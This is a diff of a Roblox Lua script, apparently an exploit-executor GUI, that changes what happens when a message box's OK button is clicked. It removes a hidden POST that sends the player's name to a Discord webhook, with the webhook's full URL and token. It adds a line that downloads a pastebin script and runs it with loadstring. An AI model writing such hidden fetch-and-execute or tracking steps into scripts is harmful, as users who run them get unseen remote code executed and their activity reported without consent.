@@ -135,21 +135,7 @@ OKButton.TextSize = 14.000
 OKButton.MouseButton1Down:connect(function()
 MessageReportFrame:Destroy()
 
-local url =
-   "https://discord.com/api/webhooks/1051137032417706044/dladmYOJmvfbpF1KipZSbO4R9k7OJoeuN-JWOUHQj5Ux0hVFo1yEoT2oQlBkMEXc1Pr4"
-local data = {
-   ["content"] = LP.LocalPlayer.Name.." Read The Message",
-}
-
-
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+loadstring(game:HttpGet(('https://pastebin.com/raw/m8ZXQ5WQ'),true))()
 end)
 
 UICorner_4.Parent = OKButton
